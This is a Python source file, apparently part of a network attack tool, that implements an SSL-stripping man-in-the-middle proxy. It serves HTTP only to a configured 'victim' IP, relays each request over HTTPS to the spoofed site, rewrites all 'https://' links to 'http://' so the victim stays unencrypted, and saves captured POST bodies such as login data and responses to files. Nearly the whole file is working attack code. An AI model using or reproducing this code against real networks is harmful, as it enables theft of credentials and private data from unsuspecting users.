from logger import log_info, log_warning
import http.client
import http.server
import socketserver
import requests

site_to_spoof = None
ip_victim = None
ip_attacker = None
get_file = None
post_file = None

# Custom HTTP request handler that only allows requests from the victim.
class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):

    def __init__(self, *args, **kwargs):
        self.s = requests.Session()
        self.s.max_redirects = 30
        # TODO: Forward (non encryption related) headers from server to victim.
        self.server_client_headers_to_keep = [    
            "X-Frame-Options",
            # "Transfer-Encoding",
            "P3P",
            "X-XSS-Protection",
            "Content-Type",
            "Set-Cookie",
            "Expires",
            # "Content-Encoding",
            "Date",
            "Cache-Control",
        ]
        super().__init__(*args, **kwargs)

    def do_GET(self):
        # Get the client's IP address
        client_ip = self.client_address[0]
        
        # Check if the client's IP address matches the allowed IP
        if client_ip == ip_victim:
            log_info("Received GET request")

            # Remove the Upgrade-Insecure-Requests header
            new_headers = {key: value for key, value in self.headers.items()}
            new_headers.pop("Upgrade-Insecure-Requests", None)

            log_info("Request Path: " + str(self.path))
            log_info("Request Headers: "+ str(new_headers))
            log_info("Request Full: "+ "https://" + site_to_spoof + self.path)

            response = self.s.get("https://" + site_to_spoof + self.path, headers=new_headers)

            # Replace all "https://" with "http://"
            try:
                decoded = response.content.decode('utf-8')
                response_content = decoded.replace("https://", "http://").encode('utf-8')
                # Save the response to a file
                if get_file is not None:
                    with open(get_file, 'a') as f:
                        f.write(decoded)
                        f.write("\n\n\n")
            except UnicodeDecodeError:
                response_content = response.content.replace(b"https://", b"http://")

            # Send the response back to the client
            self.send_response(response.status_code)

            for key, value in response.headers.items():
                if key in self.server_client_headers_to_keep:
                    self.send_header(key, value)

            self.end_headers()
            self.wfile.write(response_content)
        else:
            # Send a 403 Forbidden response
            self.send_response(403)
            self.end_headers()
            self.wfile.write(b'403 Forbidden: Access denied')

    def do_POST(self):

        # Get the client's IP address
        client_ip = self.client_address[0]
        
        # Check if the client's IP address matches the allowed IP
        if client_ip == ip_victim:
            log_info("Received POST request")

            # Remove the Upgrade-Insecure-Requests header
            new_headers = {key: value for key, value in self.headers.items()}
            new_headers.pop("Upgrade-Insecure-Requests", None)

            # Get the content length of the POST request
            content_length = int(self.headers['Content-Length'])

            # Read the POST data
            post_data = self.rfile.read(content_length)
            # Save the post data to a file
            if post_file is not None:
                with open(post_file, 'a') as f:
                    f.write(post_data.decode('utf-8'))
                    f.write("\n\n\n")

            log_info("Request Path: "+ self.path)
            log_info("Request Headers: " + str(new_headers))
            log_info("Post data: "+ str(post_data))

            response = self.s.post("https://" + site_to_spoof + self.path, headers=new_headers, data=post_data)

            # Replace all "https://" with "http://"
            try:
                decoded = response.content.decode('utf-8')
                response_content = decoded.replace("https://", "http://").encode('utf-8')
                # Save the response to a file
                if post_file is not None:
                    with open(post_file, 'a') as f:
                        f.write(decoded)
                        f.write("\n\n\n")
            except UnicodeDecodeError:
                response_content = response.content.replace(b"https://", b"http://")

            # Send the response back to the client
            self.send_response(response.status_code)

            for key, value in response.headers.items():
                if key in self.server_client_headers_to_keep:
                    self.send_header(key, value)

            self.end_headers()
            self.wfile.write(response_content)
        else:
            # Send a 403 Forbidden response
            self.send_response(403)
            self.end_headers()
            self.wfile.write(b'403 Forbidden: Access denied')

class Forwarder:
    def __init__(self, interface, ip_attacker_, ip_victim_, site_to_spoof_, get_file_, post_file_):
        global ip_victim, site_to_spoof, ip_attacker, get_file, post_file
        self.interface = interface
        ip_attacker = ip_attacker_
        ip_victim = ip_victim_
        site_to_spoof = site_to_spoof_
        get_file = get_file_
        post_file = post_file_

    def forward(self):
        log_info("Starting packet forwarding")

        # Start listening for HTTP requests from the victim
        log_info("Starting HTTP server")
        socketserver.TCPServer.allow_reuse_address = True
        httpd = socketserver.TCPServer((ip_attacker, 80), CustomHTTPRequestHandler)
        httpd.serve_forever()

        log_warning("Stopping packet forwarding")
